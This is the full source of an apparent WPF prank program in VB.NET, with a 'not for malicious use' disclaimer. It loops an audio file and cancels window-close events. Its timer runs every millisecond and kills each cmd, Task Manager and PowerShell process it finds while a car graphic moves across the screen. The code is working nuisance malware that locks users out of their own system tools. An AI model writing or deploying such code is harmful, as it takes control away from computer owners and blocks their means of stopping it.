Imports System.Windows.Threading
Imports System.Windows.Media
Imports System.Runtime.InteropServices
Imports Microsoft.VisualBasic.Collection


' NOT FOR MALICIOUS USE. '
' This was an experiment in security, and should not be used against any persons or party.'

Class MainWindow

    Dim timer As DispatcherTimer
    Dim transForm As TranslateTransform
    Dim conv As New BooleanToVisibilityConverter
    Dim X = 0
    Dim Y = 0
    Dim Yinc = -1
    Dim Xinc = -5
    Dim pointedRight = 1
    Dim p As New Media.SoundPlayer(My.Resources.imw)
    Dim p1 As New MediaElement()

    Public Sub New()

        InitializeComponent()

        Dim memStream As New System.IO.MemoryStream
        My.Resources.imw.CopyTo(memStream)
        Dim byteArr() As Byte = memStream.ToArray

        Dim FilePath As String = My.Application.Info.DirectoryPath + "\GOTEM.mp3"
        IO.File.WriteAllBytes(FilePath, byteArr)

        song.Source = New Uri("GOTEM.mp3", UriKind.Relative)
        song.Volume = 100
        song.IsMuted = False
        song.Position = TimeSpan.FromMilliseconds(0)
        song.Play()

        transForm = New TranslateTransform(X, Y)


        timer = New DispatcherTimer()
        timer.Interval = TimeSpan.FromMilliseconds(1)

        AddHandler timer.Tick, AddressOf timerTick


        timer.Start()

    End Sub

    Private Sub songOver(sender As Object, e As EventArgs) Handles song.MediaEnded
        song.Position = TimeSpan.Zero
        song.Play()
    End Sub

    ' Plays a sound when ctrl+alt is pressed
    Private Sub checkKeyPress(sender As Object, e As KeyEventArgs) Handles Me.KeyDown
        If (Keyboard.IsKeyDown(Key.LeftCtrl) AndAlso Keyboard.IsKeyDown(Key.LeftAlt)) Then
            My.Computer.Audio.Play(My.Resources.nani, AudioPlayMode.Background)
        End If
        If (e.Key = Key.R) Then
            e.Handled = True
        End If
    End Sub

    ' Subroutine which handles a form close. Cancels the form close and plays a sound
    Private Sub Form1_Closing(sender As Object, e As _
        System.ComponentModel.CancelEventArgs) Handles MyBase.Closing
        e.Cancel = True
        My.Computer.Audio.Play(My.Resources.what, AudioPlayMode.Background)
    End Sub

    Private Sub timerTick(sender As Object, e As EventArgs)

        ' Checks all processes, if it's the cmd, taskmanager, or powershell, kill it.
        For Each proc As Process In Process.GetProcesses
            If proc.ProcessName = "cmd" OrElse proc.ProcessName = "Taskmgr" OrElse proc.ProcessName = "powershell" Then
                proc.Kill()
            End If
        Next

        ' The rest of this subroutine just moves the car around the screen

        X += Xinc
        Y += Yinc

        transForm.Transform(New Point(X, Y))
        Canv.SetTop(Car, Y)
        Canv.SetLeft(Car, X)
        Canv.SetTop(Car1, Y)
        Canv.SetLeft(Car1, X)
        Car.RenderTransform = transForm
        Car1.RenderTransform = transForm

        If ((X + Car.Width - 15) > System.Windows.SystemParameters.PrimaryScreenWidth) Or (X + 15 < 0) Then
            Xinc = -Xinc
            If pointedRight = 1 Then
                Car.Visibility = False
                Car1.Visibility = True
                pointedRight = 0
            ElseIf pointedRight = 0 Then
                Car.Visibility = True
                Car1.Visibility = False
                pointedRight = 1
            End If
        End If
        If ((Y + Car.Height - 10) > System.Windows.SystemParameters.PrimaryScreenHeight) Or (Y + 10 < 0) Then
            Yinc = -Yinc
        End If
    End Sub
End Class
